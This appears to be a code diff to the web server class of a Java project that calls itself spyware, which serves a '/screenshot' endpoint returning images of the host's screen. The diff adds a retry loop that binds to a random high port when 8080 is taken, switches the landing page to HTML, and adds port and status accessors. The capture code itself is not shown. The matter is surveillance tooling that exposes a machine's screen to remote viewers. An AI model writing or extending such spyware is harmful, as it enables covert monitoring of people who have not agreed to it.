@@ -7,6 +7,7 @@ import java.io.OutputStream;
 import java.io.UncheckedIOException;
 import java.net.InetSocketAddress;
 import java.nio.charset.StandardCharsets;
+import java.util.Random;
 import java.util.concurrent.Executors;
 
 /**
@@ -18,14 +19,28 @@ import java.util.concurrent.Executors;
 public class WebServer {
     private HttpServer server;
 
+    private int port;
+
     /**
      * Starts the web server without blocking. Intended for Windows service wrappers.
      */
     public void start(int port) {
+      this.port = port;
       try {
         server = HttpServer.create(new InetSocketAddress(port), 0);
       } catch (IOException e) {
-        throw new UncheckedIOException(e);
+        if (port == 8080) {
+          Random random = new Random();
+          while (server == null) {
+            this.port = random.nextInt(65535 - 1024) + 1024;
+            try {
+              server = HttpServer.create(new InetSocketAddress(this.port), 0);
+            } catch (IOException ignored) {
+            }
+          }
+        } else {
+          throw new UncheckedIOException(e);
+        }
       }
 
       // Register handlers
@@ -37,9 +52,9 @@ public class WebServer {
                 exchange.close();
                 return;
             }
-            String message = "Spyware web service is running. Try GET /screenshot to get a PNG screenshot.";
+            String message = "<html><body>Spyware web service is running. Try GET <a href=\"/screenshot\">/screenshot</a> to get a PNG screenshot.</body></html>";
             byte[] body = message.getBytes(StandardCharsets.UTF_8);
-            exchange.getResponseHeaders().add("Content-Type", "text/plain; charset=utf-8");
+            exchange.getResponseHeaders().add("Content-Type", "text/html; charset=utf-8");
             exchange.sendResponseHeaders(200, body.length);
             try (OutputStream os = exchange.getResponseBody()) {
                 os.write(body);
@@ -48,7 +63,11 @@ public class WebServer {
 
         server.setExecutor(Executors.newCachedThreadPool());
         server.start();
-        System.out.println("[Spyware] Web server started on port " + port + ". Endpoints: /, /screenshot");
+        System.out.println("[Spyware] Web server started on port " + this.port + ". Endpoints: /, /screenshot");
+    }
+
+    public int getPort() {
+        return port;
     }
 
     /**
@@ -63,5 +82,9 @@ public class WebServer {
         server.stop(0);
         server = null;
         System.out.println("[Spyware] Web server stopped");
+    }
+
+    public boolean isRunning() {
+        return server != null;
     }
 }
